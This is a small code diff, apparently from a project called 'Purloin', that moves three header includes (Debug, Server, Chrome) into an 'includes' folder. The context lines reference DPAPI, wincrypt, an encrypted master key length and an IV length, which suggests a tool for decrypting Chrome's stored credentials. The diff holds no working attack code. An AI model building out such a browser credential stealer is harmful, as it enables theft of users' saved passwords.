@@ -15,9 +15,9 @@
 //#include <ws2tcpip.h>
 #include <dpapi.h>
 #include <wincrypt.h>
-#include "Purloin/Purloin_Debug.h"
-#include "Purloin/Purloin_Server.h"
-#include "Purloin/Purloin_Chrome.h"
+#include "Purloin/includes/Purloin_Debug.h"
+#include "Purloin/includes/Purloin_Server.h"
+#include "Purloin/includes/Purloin_Chrome.h"
 
 #define ENC_MASTER_KEY_LEN 357
 #define IV_LEN 12
